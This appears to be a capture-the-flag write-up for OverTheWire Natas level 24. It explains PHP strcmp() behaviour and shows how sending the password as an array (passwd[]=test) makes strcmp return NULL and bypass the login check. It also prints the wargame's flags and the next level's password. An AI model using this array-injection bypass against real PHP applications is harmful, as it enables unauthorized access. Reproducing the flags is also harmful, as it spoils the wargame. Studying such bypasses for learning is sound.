# Natas Level 23 → Level 24 bypassing PHP strcmp() 

## Previous Flag
<b>MeuqmfJ8DDKuTr5pcvzFKSwlxedZYEWd</b>

## Goal
Username: natas24<br>
URL: http://natas24.natas.labs.overthewire.org<br>

Password:<br>
Login

## What I learned
```
strcmp PHP Documentation: https://www.php.net/manual/en/function.strcmp.php
    Returns a value less than 0 if string1 is less than string2
    Returns a value greater than 0 if string1 is greater than string2
    Returns 0 if they are equal

@trungdullc ➜ /workspaces/01noobHacker (main) $ php -d xdebug.mode=off -a ⌨️
Interactive shell

php > echo strcmp("a", "bear");                     # 1st arg - 2nd arg (assembly)
-1
php > echo strcmp("a", "cat");
-2
php > echo strcmp("a", "car");
-2
php > echo strcmp("a", "cuddle");
-2
php > echo strcmp("cuddle", "a");
2
php > echo strcmp("ca", "cb");
-1

Note: Most PHP function bypasses are well-known and covered on various blogs
Google: bypassing PHP strcmp()
https://blog.0daylabs.com/2015/09/21/csaw-web-200-write-up/?ref=learnhacking.io 

$username = $_POST['username'];
$password = $_POST['password'];
$real_password = "original_password_here";

if (strcmp($password, $real_password) == 0) { echo "flag{}"; } 👀

Capturing request w/ tamper data & replacing password=lol w/ password[]=lol to bypass authentication
    $password becomes an array
    returns NULL and in PHP NULL == 0 (True), which means string comparison passed
```

## Solution
```
View source code
http://natas24.natas.labs.overthewire.org/index-source.html

<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src="http://natas.labs.overthewire.org/js/wechall-data.js"></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas24", "pass": "<censored>" };</script></head>
<body>
<h1>natas24</h1>
<div id="content">

Password:
<form name="input" method="get">
    <input type="text" name="passwd" size=20>
    <input type="submit" value="Login">
</form>

<?php
    if(array_key_exists("passwd",$_REQUEST)){
        if(!strcmp($_REQUEST["passwd"],"<censored>")){ 👀
            echo "<br>The credentials for the next level are:<br>";
            echo "<pre>Username: natas25 Password: <censored></pre>";
        }
        else{
            echo "<br>Wrong!<br>";
        }
    }
    // morla / 10111
?>  
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>

Password: test
Browser: http://natas24.natas.labs.overthewire.org/?passwd=test ⌨️
Browser: http://natas24.natas.labs.overthewire.org/?passwd[]=test ⌨️         # Vulnerability

Warning: strcmp() expects parameter 1 to be string, array given in /var/www/natas/natas24/index.php on line 23

The credentials for the next level are:
Username: natas25 Password: ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws 🔐
```

## Flag
<b>ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws</b>

## Continue
[Continue](./Natas2425.md)